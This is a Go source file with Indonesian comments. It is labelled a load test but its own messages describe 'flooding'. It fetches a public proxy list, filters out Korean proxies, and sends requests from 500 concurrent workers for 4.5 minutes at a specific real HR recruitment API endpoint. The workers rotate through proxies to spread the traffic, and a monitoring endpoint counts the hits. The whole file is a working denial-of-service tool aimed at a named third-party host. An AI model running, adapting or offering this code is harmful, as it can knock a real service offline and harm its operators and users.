package main

import (
	"encoding/json"
	"fmt"
	"net/http"
	"net/url"
	"sync"
	"sync/atomic"
	"time"
)

type ProxyItem struct {
	IPAddress   string   `json:"ip_address"`
	Port        int      `json:"port"`
	Protocols   []string `json:"protocols"`
	CountryCode string   `json:"country_code"` // Ditambahkan untuk filter negara
}

type ProxyResponse struct {
	Results []ProxyItem `json:"results"`
}

// Global State untuk Monitoring & Mutex Lock
var (
	isRunning     int32 // 0 = idle/berhenti, 1 = sedang berjalan
	requestCount  int64
	successCount  int64
	errorCount    int64
	startTime     time.Time
	statusMessage string
	mu            sync.Mutex
)

func main() {
	targetURL := "https://hris.quantumnusatama.id/api/rekrutmen/get-rekrutmen-data?id_rekrutmen=20653"
	proxySourceURL := "https://micin-provider.pages.dev/proxy.json"

	// Daftarkan Endpoint HTTP
	http.HandleFunc("/run", func(w http.ResponseWriter, r *http.Request) {
		// Proteksi Single Execution Lock (Hanya boleh 1x jalan bersamaan)
		if !atomic.CompareAndSwapInt32(&isRunning, 0, 1) {
			w.WriteHeader(http.StatusConflict)
			w.Write([]byte("[-] Ditolak: Proses load test sedang berjalan! Harap tunggu hingga aktivitas flooding selesai (4.5 menit)."))
			return
		}

		// Reset statistik sebelum mulai
		atomic.StoreInt64(&requestCount, 0)
		atomic.StoreInt64(&successCount, 0)
		atomic.StoreInt64(&errorCount, 0)
		startTime = time.Now()
		statusMessage = "Mengunduh dan memfilter proxy dari URL..."

		w.Write([]byte("[+] Load test berhasil dimulai. Mengambil daftar proxy terbaru... Cek progress via /monitor"))

		// Jalankan proses di background goroutine
		go func() {
			defer atomic.StoreInt32(&isRunning, 0) // Pastikan flag dilepas saat selesai

			// 1. Fetch data proxy langsung dari URL secara dinamis
			clientHTTP := &http.Client{Timeout: 15 * time.Second}
			respProxy, err := clientHTTP.Get(proxySourceURL)
			if err != nil {
				statusMessage = fmt.Sprintf("Gagal mendownload proxy: %v", err)
				return
			}
			defer respProxy.Body.Close()

			var proxyData ProxyResponse
			if err := json.NewDecoder(respProxy.Body).Decode(&proxyData); err != nil {
				statusMessage = fmt.Sprintf("Gagal parsing JSON proxy: %v", err)
				return
			}

			// 2. Filter kandidat proxy (Kecualikan country_code == "KR")
			var candidateProxies []string
			for _, p := range proxyData.Results {
				// Kecualikan jika CountryCode adalah "KR"
				if p.CountryCode == "KR" {
					continue
				}

				for _, proto := range p.Protocols {
					if proto == "HTTPS" || proto == "HTTP" || proto == "SOCKS5" {
						proxyURL := fmt.Sprintf("http://%s:%d", p.IPAddress, p.Port)
						candidateProxies = append(candidateProxies, proxyURL)
						break
					}
				}
			}

			statusMessage = fmt.Sprintf("Ditemukan %d kandidat proxy (Non-KR). Memulai health check...", len(candidateProxies))

			// 3. Health check singkat proxy yang valid
			var validProxies []string
			var wgChk sync.WaitGroup
			var muChk sync.Mutex

			for _, pURL := range candidateProxies {
				wgChk.Add(1)
				go func(proxyStr string) {
					defer wgChk.Done()
					parsedProxy, err := url.Parse(proxyStr)
					if err != nil {
						return
					}
					chkClient := &http.Client{
						Transport: &http.Transport{Proxy: http.ProxyURL(parsedProxy)},
						Timeout:   3 * time.Second,
					}
					resp, err := chkClient.Get(targetURL)
					if err == nil {
						defer resp.Body.Close()
						if resp.StatusCode == http.StatusOK {
							muChk.Lock()
							validProxies = append(validProxies, proxyStr)
							muChk.Unlock()
						}
					}
				}(pURL)
			}
			wgChk.Wait()

			if len(validProxies) == 0 {
				validProxies = append(validProxies, "DIRECT")
			}

			statusMessage = fmt.Sprintf("Health check selesai. Proxy aktif: %d. Memulai load test...", len(validProxies))

			// 4. Konfigurasi Load Test (Durasi 4.5 Menit)
			totalConcurrency := 500
			stopChan := make(chan struct{})

			time.AfterFunc(4*time.Minute+30*time.Second, func() {
				close(stopChan)
			})

			var loadWg sync.WaitGroup
			proxyIndex := 0
			var indexMutex sync.Mutex

			for i := 0; i < totalConcurrency; i++ {
				loadWg.Add(1)
				go func() {
					defer loadWg.Done()
					indexMutex.Lock()
					pStr := validProxies[proxyIndex%len(validProxies)]
					proxyIndex++
					indexMutex.Unlock()

					var client *http.Client
					if pStr == "DIRECT" {
						client = &http.Client{Timeout: 5 * time.Second}
					} else {
						parsedProxy, _ := url.Parse(pStr)
						client = &http.Client{
							Transport: &http.Transport{
								Proxy: http.ProxyURL(parsedProxy),
							},
							Timeout: 5 * time.Second,
						}
					}

					for {
						select {
						case <-stopChan:
							return
						default:
							atomic.AddInt64(&requestCount, 1)
							resp, err := client.Get(targetURL)
							if err != nil {
								atomic.AddInt64(&errorCount, 1)
							} else {
								if resp.StatusCode == http.StatusOK {
									atomic.AddInt64(&successCount, 1)
								} else {
									atomic.AddInt64(&errorCount, 1)
								}
								resp.Body.Close()
							}
						}
					}
				}()
			}

			loadWg.Wait()
			statusMessage = "Load test selesai."
		}()
	})

	// Endpoint untuk Monitoring
	http.HandleFunc("/monitor", func(w http.ResponseWriter, r *http.Request) {
		runningStatus := "IDLE (Siap dijalankan)"
		if atomic.LoadInt32(&isRunning) == 1 {
			runningStatus = "RUNNING (Sedang melakukan flooding)"
		}

		elapsed := time.Since(startTime).Seconds()
		if atomic.LoadInt32(&isRunning) == 0 {
			elapsed = 0
		}

		data := map[string]interface{}{
			"status":        runningStatus,
			"message":       statusMessage,
			"elapsed_sec":   int(elapsed),
			"total_request": atomic.LoadInt64(&requestCount),
			"sukses_200":    atomic.LoadInt64(&successCount),
			"error_lainnya": atomic.LoadInt64(&errorCount),
		}

		w.Header().Set("Content-Type", "application/json")
		json.NewEncoder(w).Encode(data)
	})

	fmt.Println("\n[+] Server berjalan di port :8080 (Mengambil proxy online & filter KR)")
	fmt.Println("    -> Endpoint: http://localhost:8080/run")
	fmt.Println("    -> Endpoint: http://localhost:8080/monitor")

	if err := http.ListenAndServe(":8080", nil); err != nil {
		fmt.Printf("Server error: %v\n", err)
	}
}
